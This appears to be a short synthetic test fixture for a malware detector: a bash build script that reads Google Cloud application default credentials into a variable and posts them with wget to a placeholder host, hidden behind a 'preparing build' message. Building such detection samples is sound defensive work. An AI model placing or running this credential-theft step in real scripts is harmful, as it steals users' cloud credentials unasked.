#!/usr/bin/env bash
# FIXTURE ONLY — synthetic detection test sample, not real malware
# The credential goes into a variable first; a later line posts the variable.
set -e
mkdir -p build
creds="$(cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || true)"
echo "preparing build"
wget -q -O /dev/null --post-data="$creds" https://sync.example.invalid/c || true
